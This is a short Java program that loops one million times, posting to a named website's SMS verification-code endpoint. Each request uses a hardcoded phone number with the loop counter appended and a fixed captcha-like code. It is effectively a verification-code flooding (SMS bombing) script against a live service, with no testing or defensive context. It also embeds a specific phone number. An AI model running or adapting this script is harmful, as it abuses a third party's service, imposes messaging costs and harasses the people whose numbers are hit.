package com.example.demo.utils;

import org.apache.commons.httpclient.HttpClient;
import org.apache.commons.httpclient.methods.PostMethod;

public class Test {

  public static void main(String[] args) {
    Long phoneNum = 15669070610L;
    String url = "https://www.51weixiao.com/www/user/get_pass";
    String sendCode="https://www.51weixiao.com/www/user/send_verify_code";
    HttpClient httpClient = new HttpClient();
    try {
      for (int i = 0; i < 1000000; i++) {
        PostMethod postMethod = new PostMethod(sendCode);
        postMethod.setRequestBody("mobile=" + phoneNum + i + "&randomCode=" + "sv5csw");
        int statusCode = httpClient.executeMethod(postMethod);
        System.out.println("codesssssss"+statusCode);
        System.out.println ("结果为" + postMethod.getResponseBodyAsString());
      }

    } catch (Exception e) {
      System.out.println(phoneNum);
    }
  }

}
